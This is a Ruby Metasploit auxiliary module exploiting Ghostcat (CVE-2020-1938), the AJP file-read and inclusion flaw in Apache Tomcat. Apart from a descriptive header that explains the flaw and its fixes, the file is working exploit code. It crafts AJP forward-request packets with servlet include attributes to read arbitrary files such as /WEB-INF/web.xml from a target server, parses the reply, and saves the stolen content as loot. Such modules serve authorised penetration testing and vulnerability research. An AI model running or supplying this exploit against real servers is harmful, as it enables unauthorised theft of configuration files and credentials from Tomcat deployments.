class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Apache Tomcat AJP File Read',
        'Description' => %q{
          When using the Apache JServ Protocol (AJP), care must be taken when trusting incoming connections to Apache
          Tomcat. Tomcat treats AJP connections as having higher trust than, for example, a similar HTTP connection.
          If such connections are available to an attacker, they can be exploited in ways that may be surprising.

          In Apache Tomcat 9.0.0.M1 to 9.0.0.30, 8.5.0 to 8.5.50 and 7.0.0 to 7.0.99, Tomcat shipped with an AJP
          Connector enabled by default that listened on all configured IP addresses. It was expected (and recommended
          in the security guide) that this Connector would be disabled if not required. This vulnerability report
          identified a mechanism that allowed: - returning arbitrary files from anywhere in the web application -
          processing any file in the web application as a JSP. Further, if the web application allowed file upload
          and stored those files within the web application (or the attacker was able to control the content of the
          web application by some other means) then this, along with the ability to process a file as a JSP, made
          remote code execution possible.

          It is important to note that mitigation is only required if an AJP port is accessible to untrusted users.
          Users wishing to take a defence-in-depth approach and block the vector that permits returning arbitrary files
          and execution as JSP may upgrade to Apache Tomcat 9.0.31, 8.5.51 or 7.0.100 or later. A number of changes were
          made to the default AJP Connector configuration in 9.0.31 to harden the default configuration.
          It is likely that users upgrading to 9.0.31, 8.5.51 or 7.0.100 or later will need to make small changes
          to their configurations.
        },
        'Author' => [
          'A Security Researcher of Chaitin Tech', # POC
          'SunCSR Team' # Metasploit Module
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['CVE', '2020-1938'],
          ['EDB', '48143'],
          ['URL', 'https://www.chaitin.cn/en/ghostcat']
        ],
        'DisclosureDate' => '2020-02-20',
        'Notes' => {
          'AKA' => ['Ghostcat'],
          'Stability' => ['CRASH_SAFE'],
          'Reliability' => [],
          'SideEffects' => []
        }
      )
    )
    register_options(
      [
        Opt::RPORT(8080, true, 'The Apache Tomcat webserver port'),
        OptString.new('FILENAME', [true, 'File name', '/WEB-INF/web.xml']),
        OptBool.new('SSL', [true, 'SSL', false]),
        OptPort.new('AJP_PORT', [false, 'The Apache JServ Protocol (AJP) port', 8009])
      ]
    )

    @body_data = ''
    @header_data = ''
  end

  def method2code(method)
    methods = {
      'OPTIONS' => 1,
      'GET' => 2,
      'HEAD' => 3,
      'POST' => 4,
      'PUT' => 5,
      'DELETE' => 6,
      'TRACE' => 7,
      'PROPFIND' => 8
    }
    code = methods[method]
    code
  end

  def make_headers(headers)
    header2code = {
      'accept' => "\xA0\x01",
      'accept-charset' => "\xA0\x02",
      'accept-encoding' => "\xA0\x03",
      'accept-language' => "\xA0\x04",
      'authorization' => "\xA0\x05",
      'connection' => "\xA0\x06",
      'content-type' => "\xA0\x07",
      'content-length' => "\xA0\x08",
      'cookie' => "\xA0\x09",
      'cookie2' => "\xA0\x0A",
      'host' => "\xA0\x0B",
      'pragma' => "\xA0\x0C",
      'referer' => "\xA0\x0D",
      'user-agent' => "\xA0\x0E"
    }
    headers_ajp = []
    headers.each do |(header_name, header_value)|
      code = header2code[header_name].to_s

      if code != ''
        headers_ajp.append(code)
      else
        headers_ajp.append(ajp_string(header_name.to_s))
      end
      headers_ajp.append(ajp_string(header_value.to_s))
    end

    [int2byte(headers.length, 2), headers_ajp]
  end

  def make_attributes(attributes)
    attribute2code = {
      'remote_user' => "\x03",
      'auth_type' => "\x04",
      'query_string' => "\x05",
      'jvm_route' => "\x06",
      'ssl_cert' => "\x07",
      'ssl_cipher' => "\x08",
      'ssl_session' => "\x09",
      'req_attribute' => "\x0A",
      'ssl_key_size' => "\x0B"
    }
    attributes_ajp = []
    attributes.each do |attr|
      name = attr.keys.first.to_s
      code = (attribute2code[name]).to_s
      value = attr[name]
      next unless code != ''

      attributes_ajp.append(code)
      if code == "\x0A"
        value.each do |v|
          attributes_ajp.append(ajp_string(v.to_s))
        end
      else
        attributes_ajp.append(ajp_string(value.to_s))
      end
    end

    attributes_ajp
  end

  def ajp_string(message_bytes)
    "#{int2byte(message_bytes.length, 2)}#{message_bytes}\x00"
  end

  def int2byte(data, byte_len = 1)
    if byte_len == 1
      [data].pack('C')
    else
      [data].pack('n*')
    end
  end

  def make_forward_request_package(method, headers, attributes)
    prefix_code_int = 2
    prefix_code_bytes = int2byte(prefix_code_int)
    method_bytes = int2byte(method2code(method))
    protocol_bytes = 'HTTP/1.1'
    req_uri_bytes = '/index.txt'
    remote_addr_bytes = '127.0.0.1'
    remote_host_bytes = 'localhost'
    server_name_bytes = datastore['RHOST'].to_s

    if datastore['SSL'] == true
      is_ssl_boolean = 1
    else
      is_ssl_boolean = 0
    end
    server_port_int = datastore['RPORT']
    if server_port_int.to_s == ''
      server_port_int = (is_ssl_boolean ^ 1) * 80 + (is_ssl_boolean ^ 0) * 443
    end
    is_ssl_bytes = int2byte(is_ssl_boolean, 1)
    server_port_bytes = int2byte(server_port_int, 2)
    headers.append(['host', "#{server_name_bytes}:#{server_port_int}"])
    num_headers_bytes, headers_ajp_bytes = make_headers(headers)

    attributes_ajp_bytes = make_attributes(attributes)
    message = []
    message.append(prefix_code_bytes)
    message.append(method_bytes)
    message.append(ajp_string(protocol_bytes.to_s))
    message.append(ajp_string(req_uri_bytes.to_s))
    message.append(ajp_string(remote_addr_bytes.to_s))
    message.append(ajp_string(remote_host_bytes.to_s))
    message.append(ajp_string(server_name_bytes.to_s))
    message.append(server_port_bytes)
    message.append(is_ssl_bytes)
    message.append(num_headers_bytes)
    message += headers_ajp_bytes
    message += attributes_ajp_bytes
    message.append("\xff")
    message_bytes = message.join
    send_bytes = "\x12\x34#{ajp_string(message_bytes.to_s)}"

    send_bytes
  end

  def send_recv_once(data)
    buf = ''
    begin
      connect(true, { 'RHOST' => datastore['RHOST'].to_s, 'RPORT' => datastore['AJP_PORT'].to_i, 'SSL' => datastore['SSL'] })
      sock.put(data)
      buf = sock.get(30) || ''
    rescue Rex::AddressInUse, ::Errno::ETIMEDOUT, Rex::HostUnreachable, Rex::ConnectionTimeout, Rex::ConnectionRefused, ::Timeout::Error, ::EOFError => e
      elog('Error socket', error: e)
    ensure
      disconnect
    end
    buf
  end

  def read_buf_string(buf, idx)
    content = ''
    len = buf[idx..(idx + 2)].unpack('n')[0]
    idx += 2
    content += (buf[idx..(idx + len - 1)]).to_s
    idx += len + 1
    [idx, content]
  end

  def parse_response(buf, idx)
    common_response_headers = {
      "\x01" => 'Content-Type',
      "\x02" => 'Content-Language',
      "\x03" => 'Content-Length',
      "\x04" => 'Date',
      "\x05" => 'Last-Modified',
      "\x06" => 'Location',
      "\x07" => 'Set-Cookie',
      "\x08" => 'Set-Cookie2',
      "\x09" => 'Servlet-Engine',
      "\x0a" => 'Status',
      "\x0b" => 'WWW-Authenticate'
    }
    idx += 2
    idx += 2
    if buf[idx] == "\x04"
      idx += 1
      print @header_data
      @header_data += 'Status Code: '
      idx += 2
      idx, val = read_buf_string(buf, idx)
      @header_data += val
      @header_data += "\n"
      header_num = buf[idx..(idx + 2)].unpack('n')[0]
      idx += 2

      (1..header_num).each do |_i|
        if buf[idx] == "\xA0"
          idx += 1
          @header_data += "#{common_response_headers[buf[idx]]}: "
          idx += 1
        else
          idx, val = read_buf_string(buf, idx)
          @header_data += val
          @header_data += ': '
        end

        idx, val = read_buf_string(buf, idx)
        @header_data += val
        @header_data += "\n"
      end
    elsif buf[idx] == "\x05"
      return 0
    elsif buf[idx] == "\x03"
      idx += 1
      idx, val = read_buf_string(buf, idx)
      @body_data += val
    else
      return 1
    end

    parse_response(buf, idx)
  end

  def read_success?(header)
    # As far as we can tell, a successful status code can be either:
    # 200
    # 200 OK
    # OK
    # And so this should handle all three.
    # See this issue for more details:
    # https://github.com/rapid7/metasploit-framework/issues/15673

    status_code = header.scan(/Status Code: (\w+)/).flatten.first

    (status_code == '200' || status_code == 'OK')
  end

  def read_remote_file
    headers = []
    method = 'GET'
    target_file = datastore['FILENAME'].to_s
    attributes = [
      { 'req_attribute' => ['javax.servlet.include.request_uri', 'index'] },
      { 'req_attribute' => ['javax.servlet.include.path_info', target_file] },
      { 'req_attribute' => ['javax.servlet.include.servlet_path', '/'] }
    ]
    data = make_forward_request_package(method, headers, attributes)
    buf = send_recv_once(data)
    parse_response(buf, 0)
  end

  def check
    read_remote_file
    if read_success?(@header_data)
      return Exploit::CheckCode::Appears("Successfully read file #{datastore['FILENAME']}")
    end

    Exploit::CheckCode::Safe
  rescue StandardError => e
    Exploit::CheckCode::Unknown(e.message)
  end

  def run
    read_remote_file
    print @header_data
    print @body_data

    if read_success?(@header_data)
      file = store_loot(
        datastore['FILENAME'].to_s, 'text/plain', datastore['RHOST'].to_s,
        @body_data, 'Ghostcat File Read/Inclusion', 'Read file', datastore['FILENAME']
      )
      print_good file
    else
      print_error 'Unable to read file, target may not be vulnerable.'
    end
  end
end
